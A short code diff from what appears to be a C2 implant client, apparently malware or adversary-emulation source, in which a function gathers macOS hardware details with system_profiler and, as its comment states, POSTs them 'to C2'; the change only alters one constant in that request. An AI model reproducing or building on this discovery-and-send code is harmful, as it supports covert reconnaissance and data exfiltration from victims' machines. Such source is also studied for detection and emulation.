@@ -94,7 +94,7 @@ bool ClientPP::osInfo (int dwRandomTimeSleep, ClientPP * c) {
         os_info += client::executeCmd("system_profiler SPHardwareDataType 2>/dev/null | awk '/Memory/ {split($0,line, \": \"); printf(\"%s\", line[2]);}'") + "\n";
 
         // send POST request with data to C2
-        std::vector<unsigned char> response_vector = ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(os_info.begin(), os_info.end()), 0x33);
+        std::vector<unsigned char> response_vector = ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(os_info.begin(), os_info.end()), 0x55);
 
         completed_discovery = true;
     }
